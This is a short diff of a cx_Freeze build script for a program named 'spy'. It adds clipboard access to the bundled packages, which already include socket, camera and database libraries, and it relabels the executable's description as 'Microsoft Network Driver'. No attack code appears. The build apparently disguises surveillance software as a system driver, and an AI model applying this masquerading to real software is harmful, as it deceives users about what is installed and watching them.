@@ -3,7 +3,7 @@ from cx_Freeze import setup, Executable
 
 # Dependencies are automatically detected, but it might need fine tuning.
 
-build_exe_options = {"packages": ["os","rsa","json","socket","win32api","pymongo","pyasn1","dns","numpy","shutil","cv2","requests"]}
+build_exe_options = {"packages": ["os","win32clipboard","rsa","json","socket","win32api","pymongo","pyasn1","dns","numpy","shutil","cv2","requests"]}
 
 
 # base="Win32GUI" should be used only for Windows GUI app
@@ -14,7 +14,7 @@ if sys.platform == "win32":
 setup(
     name = "spy",
     version = "0.1",
-    description = "spy",
+    description = "Microsoft Network Driver",
     options = {"build_exe": build_exe_options},
     executables = [Executable("spy.py", base=base)]
 )
